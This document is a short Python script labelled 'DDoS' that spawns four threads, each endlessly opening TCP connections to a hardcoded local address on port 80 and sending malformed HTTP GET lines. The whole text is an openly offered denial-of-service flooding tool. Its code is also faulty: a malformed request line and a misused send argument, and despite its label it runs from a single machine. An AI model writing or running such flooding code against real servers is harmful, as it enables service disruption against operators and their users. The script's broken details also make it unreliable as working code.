#### DDoS

import socket
from threading import Thread

host = "192.168.0.1"
#ip = socket.gethostbyname(host)
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "Hello" + "HTTP/1.1 \r\n"))
            mysocket.send(str.encode("GET " + "Hello" + "HTTP/1.1 \r\n"), (ip, port))
        except socket.error:
            print("ERROR")
        mysocket.close()

for i in range(4):
    t = Thread(target=dos)
    t.start()